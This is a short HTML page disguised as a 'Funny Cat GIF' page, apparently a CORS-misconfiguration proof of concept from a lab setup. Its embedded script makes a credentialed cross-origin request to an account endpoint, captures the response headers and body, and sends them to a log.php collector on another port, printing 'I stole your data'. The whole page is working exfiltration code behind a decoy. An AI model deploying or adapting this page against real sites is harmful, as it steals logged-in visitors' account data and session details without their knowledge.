<!DOCTYPE html>
<html>
    <head>
        <title>Funny Cat GIF</title>
    </head>
    <body style="text-align:center;">
        <div>Check this out</div>
        <div>
            <img src="cute-kitty-best-kitty.gif" width="400" />
        </div>
        <script type="text/javascript">
        var req = new XMLHttpRequest(); 
        req.onload = reqListener; 
        req.open('get','http://localhost/account', true);
        req.withCredentials = true;
        req.send();

        function reqListener() {
            console.log("I stole your data. Haha!!!");
            headers = req.getAllResponseHeaders();

            var xhttp = new XMLHttpRequest();
            xhttp.open("GET", "http://localhost:81/log.php?key="+headers+"\n"+this.responseText, true);
            xhttp.send();
        };
        </script>
    </body>
</html>
